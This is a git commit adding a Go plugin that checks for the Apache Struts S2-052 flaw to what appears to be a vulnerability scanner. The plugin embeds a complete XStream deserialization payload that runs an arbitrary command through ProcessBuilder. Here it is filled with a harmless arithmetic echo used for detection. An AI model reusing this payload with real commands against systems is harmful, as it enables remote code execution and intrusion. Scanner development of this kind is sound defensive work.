314000ff691847dfc78c902be52ce6c00a2001d9
shaochuyu <shaochuyu@360.cn>
2024-01-06 00:44:29 +0800

    【plugins.struts】添加S2-052插件

--- core/plugins/struts/s2-052.go
+++ core/plugins/struts/s2-052.go
@@ -3,3 +3,110 @@
 * @Date: 5/7/2022 11:30
  */
 package struts
+
+import (
+	"bytes"
+	"context"
+	"strconv"
+	"strings"
+	"wscan/core/http"
+	"wscan/core/model"
+	"wscan/core/plugins/base"
+	"wscan/core/utils"
+	logger "wscan/core/utils/log"
+)
+
+var ExecPayload052 = `<map>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString>
+      <flags>0</flags>
+      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+        <dataHandler>
+          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+            <is class="javax.crypto.CipherInputStream">
+              <cipher class="javax.crypto.NullCipher">
+                <initialized>false</initialized>
+                <opmode>0</opmode>
+                <serviceIterator class="javax.imageio.spi.FilterIterator">
+                  <iter class="javax.imageio.spi.FilterIterator">
+                    <iter class="java.util.Collections$EmptyIterator"/>
+                    <next class="java.lang.ProcessBuilder">
+                      <command>
+                        {cmd}
+                      </command>
+                      <redirectErrorStream>false</redirectErrorStream>
+                    </next>
+                  </iter>
+                  <filter class="javax.imageio.ImageIO$ContainsFilter">
+                    <method>
+                      <class>java.lang.ProcessBuilder</class>
+                      <name>start</name>
+                      <parameter-types/>
+                    </method>
+                    <name>foo</name>
+                  </filter>
+                  <next class="string">foo</next>
+                </serviceIterator>
+                <lock/>
+              </cipher>
+              <input class="java.lang.ProcessBuilder$NullInputStream"/>
+              <ibuffer></ibuffer>
+              <done>false</done>
+              <ostart>0</ostart>
+              <ofinish>0</ofinish>
+              <closed>false</closed>
+            </is>
+            <consumed>false</consumed>
+          </dataSource>
+          <transferFlavors/>
+        </dataHandler>
+        <dataLen>0</dataLen>
+      </value>
+    </jdk.nashorn.internal.objects.NativeString>
+    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+</map>`
+
+type S052 struct {
+}
+
+func (*S052) Finger() *base.Finger {
+	return &base.Finger{
+		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
+			flow := ab.GetTargetFlow()
+			logger.Infof("开始检测S2-052, %s", flow.Request.URL())
+			r1 := utils.RandInt(1000000, 10000000)
+			r2 := utils.RandInt(1000000, 10000000)
+			payload := ExecPayload052
+			payload = strings.Replace(payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
+			payload = strings.Replace(payload, "{{r1}}", strconv.Itoa(r1), -1)
+			payload = strings.Replace(payload, "{{r2}}", strconv.Itoa(r2), -1)
+			req, err := http.NewRequest("GET", flow.Request.URL().String(), nil)
+			if err != nil {
+				logger.Error(err)
+				return nil
+			}
+			req.WithBody(bytes.NewReader([]byte(payload)), "application/xml")
+			res, err := ab.HTTPClient.Respond(context.TODO(), req)
+			if err != nil {
+				return nil
+			}
+
+			if strings.Contains(res.Text, strconv.Itoa(r1+r2)) {
+				v := ab.NewWebVuln(req, res, nil)
+				if v != nil {
+					v.SetTargetURL(flow.Request.URL())
+					v.Payload = payload
+					ab.OutputVuln(v)
+				}
+			}
+			return nil
+		},
+		Channel: "web-directory",
+		Binding: &model.VulnBinding{ID: "struts/s2-052/default", Plugin: "struts/s2-052", Category: "struts/s2-052"},
+	}
+}
